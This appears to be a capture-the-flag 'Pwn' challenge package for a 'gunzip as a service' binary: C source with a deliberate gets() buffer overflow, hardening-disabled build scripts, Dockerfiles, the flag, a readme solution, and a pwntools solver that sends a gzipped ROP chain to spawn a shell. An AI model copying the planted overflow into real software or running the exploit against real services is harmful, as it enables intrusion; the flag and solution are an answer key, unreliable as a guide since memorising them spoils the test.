{
    "build.sh": "#!/bin/bash\ndocker build -t gcc:debian -f Dockerfile.build .\ndocker run --net=host --user $(id -u):$(id -g) --rm -ti -v $(pwd):/opt/build gcc:debian gunzipasaservice.c -o gunzipasaservice -fno-stack-protector -no-pie -m32",
    "Dockerfile": "FROM debian:bullseye-slim as build\n\nRUN apt update\nRUN apt -y install build-essential gcc-multilib\nCOPY gunzipasaservice.c /tmp/gunzipasaservice.c\nRUN gcc /tmp/gunzipasaservice.c -o /tmp/gunzipasaservice -fno-stack-protector -no-pie -m32\n\nFROM debian:bullseye-slim \nRUN dpkg --add-architecture i386\nRUN apt update\nRUN apt install -y socat\nRUN apt install -y libc6:i386\nCOPY --from=build /tmp/gunzipasaservice /pwn/gunzipasaservice\nCOPY flag.txt /pwn/flag.txt\n\nWORKDIR /pwn\n\nEXPOSE 4709\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat -d -d tcp-l:4709,reuseaddr,fork exec:/pwn/gunzipasaservice,stderr\"]\n",
    "Dockerfile.build": "\nFROM debian:bullseye-slim as build\n\nRUN apt update; apt -y install build-essential gcc-multilib\n\nWORKDIR /opt/build\n\nENTRYPOINT [\"gcc\"]\n",
    "flag.txt": "gigem{r0p_71m3}",
    "gunzipasaservice.c": "#include <stdio.h>\n#include <string.h>\n#include <unistd.h> \n\nint subprocess(const char *cmd, int* to, int* from) {\n    int input[2];\n    int output[2];\n\n    pipe(input);\n    pipe(output);\n\n    if(fork() == 0) {\n        close(input[1]);\n        dup2(input[0], 0);\n        close(output[0]);\n        dup2(output[1], 1);\n        execl(\"/bin/sh\", \"sh\", \"-c\", cmd, NULL);\n    }\n    *to = input[1];\n    *from = output[0];\n    close(output[1]);\n    return 0; \n}\n\nvoid gets_fd(char* buf, int fd) {\n\tint saved_stdin = dup(0);\n    dup2(fd, 0);\n    gets(buf);\n    dup2(saved_stdin, 0);\n}\n\nvoid gunzip() {\n    int to;\n    int from;\n    subprocess(\"gunzip\", &to, &from);\n    char filebuf[512];\n    memset(filebuf,0,512);\n    int length = read(0, filebuf, 512);\n    write(to, filebuf, length);\n    close(to);\n\n    char buf[512];\n    memset(buf, 0, 512);\n    gets_fd(&buf, from);\n    fwrite(buf, 1, 512, stdout);\n}\n\nint main() {\n\tgunzip();\n    return 0;\n}\n",
    "readme.md": "# Gunzip as a service\n\n```text\nnc 172.17.0.2 4709\n```\n<link to the binaries>\n## Setup\n\n1. `docker build -t gunzipasaservice .`\n2. `docker run --rm -d --read-only gunzipasaservice`\n\n## Brief Dev Description\n\nIt is a buffer overflow problem with the NX bit set so you can't use shellcode.  The program uses execl and has a /bin/sh string so its pretty easy to get a shell from overwriting the return address.  the buffer overflow vulnerability is not in the program input but in the buffer that the gzipped input decompresses to.  \n\n## Solution\n\n1. Determine offset required to overwrite the return address.  I just paused it in gdb and used info frame to get the return address.  \n2. Get address of execl and a /bin/sh string.  Both are used in the binary so its pretty easy to grab them with objdump and strings.  \n3. Create payload.  It should be 1048 bytes to the return address and then the execl address / placeholder / /bin/sh address\n4. Compress payload using gzip\n5. Send payload to binary\n6. Enjoy your new shell",
    "solver.py": "from pwn import *\nfrom subprocess import *\n\ncontext.terminal = '/usr/bin/terminal'\n\n#p = process(\"./gunzipasaservice\")\np = remote(\"localhost\",4709)\nelf = ELF(\"./gunzipasaservice\")\nrop = ROP(elf)\n\n\nBINSH_OFFSET = next(elf.search(b'/bin/sh'))\n\nrop.execl(BINSH_OFFSET)\npayload = b'A' * (1024 + 24)\npayload += rop.chain()\nprint(rop.dump())\nproc = Popen(\"gzip\", stdin=PIPE, stdout=PIPE, stderr=STDOUT)\n\ncompressed = proc.communicate(input=payload)[0]\nopen(\"file.txt\",\"wb\").write(compressed)\np.send(compressed)\np.interactive()\n",
    "category": "Pwn"
}